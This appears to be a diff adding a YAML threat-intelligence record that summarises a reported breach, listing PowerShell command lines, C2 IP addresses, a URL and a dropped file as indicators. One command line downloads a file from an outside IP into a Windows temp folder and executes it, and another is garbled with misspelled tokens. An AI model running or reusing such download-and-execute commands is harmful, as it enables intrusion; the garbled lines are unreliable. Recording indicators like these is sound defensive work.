@@ -1,0 +1,37 @@
+title: ''
+description: The report describes a security breach involving PowerShell commands
+  and network activity targeting specific IP addresses.
+attribution: ''
+malware_families: []
+cves: []
+ttps:
+  processes:
+  - powershell.exe
+  command_lines:
+  - powershell.exe -Command.[Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;(New-Object
+    System.Net.WebClient).DownloadFile("http://103,177,110,202", "C:\Windows\Temp\update.dat");execute()
+  - powershell.exe -Command ove-Tten ~Fath S{{Path} -Destination ${fPath) Force;Unblock-File
+    -Path S{TFath}",exeeute() waitFor()
+  powershell: []
+  scripts: []
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - C2 traffic to 103[.]177[.]110[.]202:80
+  - C2 traffic to 163[.]177[.]110[.]202:5444
+  file_activity:
+  - C:\Windows\Temp\update.dat
+  persistence: []
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses:
+  - 103[.]177[.]110[.]202
+  - 163[.]177[.]110[.]202
+  domains: []
+  urls:
+  - hxxps://103[.]177[.]110[.]202/
+authors: []
+reference: https://www.darktrace.com/blog/ai-powered-security-for-a-rapidly-growing-grocery-enterprise
+date_of_publication: May 01, 2026
+file_creation_date: May 01, 2026
